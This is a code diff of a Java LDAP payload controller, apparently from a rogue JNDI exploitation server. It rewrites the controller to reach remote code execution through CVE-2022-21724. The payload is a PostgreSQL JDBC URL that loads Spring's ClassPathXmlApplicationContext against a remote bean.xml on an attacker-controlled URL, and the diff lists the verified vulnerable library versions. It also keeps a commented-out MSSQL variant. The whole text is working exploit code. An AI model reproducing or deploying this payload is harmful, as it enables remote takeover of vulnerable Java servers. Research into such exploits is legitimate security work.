@@ -14,24 +14,33 @@ import static artsploit.Utilities.serialize;
 
 /**
  * Yields:
- * RCE via arbitrary bean creation in {@link org.apache.naming.factory.BeanFactory}
- * When bean is created on the server side, we can control its class name and setter methods,
- * so we can leverage {@link javax.el.ELProcessor#eval} method to execute arbitrary Java code via EL evaluation
+ * RCE via JDBC connection to a vulnerable Postgresql DB impacted by CVE-2022-21724.
+ * A database connection can be triggered by using the BasicDataSourceFactory of Tomcat's DBCP2 and
+ * the connection string of this class along with the JDBC driver can
+ * be controlled. So by specifying an arbitrary socketFactory class along with a single parameter
+ * socketFactoryArg in the JDBC connection string a class with a single argument public constructor
+ * can be instantiated. ClassPathXmlApplicationContext provides a single argument public constructor
+ * that can pointed to a remote XML file with the definition of a malicious spring bean there by triggering an RCE
  *
  * @see https://www.veracode.com/blog/research/exploiting-jndi-injections-java for details
  *
- * Requires:
- *  Tomcat 8+ or SpringBoot 1.2.x+ in classpath
- *  - tomcat-embed-core.jar
- *  - tomcat-embed-el.jar
+ * Input:
+ *    Config.command = URL that provides a bean to be consumed by ClassPathXmlApplicationContext  "http://0.0.0.0:7800/bean.xml"
  *
- * @author artsploit
+ * Requires:
+ *  Tomcat DBCP2, Spring and postgresql in classpath
+ *
+ *  Verified on:
+ *  - org.apache.tomcat.embed:tomcat-embed-core:8.5.61
+ *  - org.postgresql:postgresql:42.3.1
+ *  - org.springframework:spring-context:5.3.21
+ *
+ * @author snowyowl
  */
 
-@LdapMapping(uri = {"/o=tomcatdbc2ppostgres"})
+@LdapMapping(uri = {"/o=dbcp2-postgresql"})
 public class Dbcp2Postgresql implements LdapController {
 
-    @SuppressWarnings({"DuplicatedCode"})
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
 
         System.out.println("Sending LDAP ResourceRef result for " + base + " with tomcat-dbcp2-postgres-sql payload");
@@ -39,8 +48,8 @@ public class Dbcp2Postgresql implements LdapController {
         Entry e = new Entry(base);
         e.addAttribute("javaClassName", "java.lang.String"); //could be any
 
-        // payload for PostgreSQL server; works only on versions affected by CVE-2022-21724.
-         String url = "jdbc:postgresql://localhost:5432/testdb?socketFactory=org.postgresql.ssl.SingleCertValidatingFactory&socketFactoryArg=" + Config.command;
+        // works only on versions affected by CVE-2022-21724.
+         String url = "jdbc:postgresql://localhost:5432/testdb?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=" + Config.command;
 
         // payload for MSSql server  - yet to be developed into a working exploit.
         // String url = "jdbc:sqlserver://localhost:1533;connectRetryCount=0;encrypt=false;database=testdb;integratedSecurity=false;socketFactoryClass=com.snowyowl.commonsbeanutils1.jdbc.mssql.DummySocketFactory;socketFactoryConstructorArg=http://127.0.0.1:7800/bean.xml";
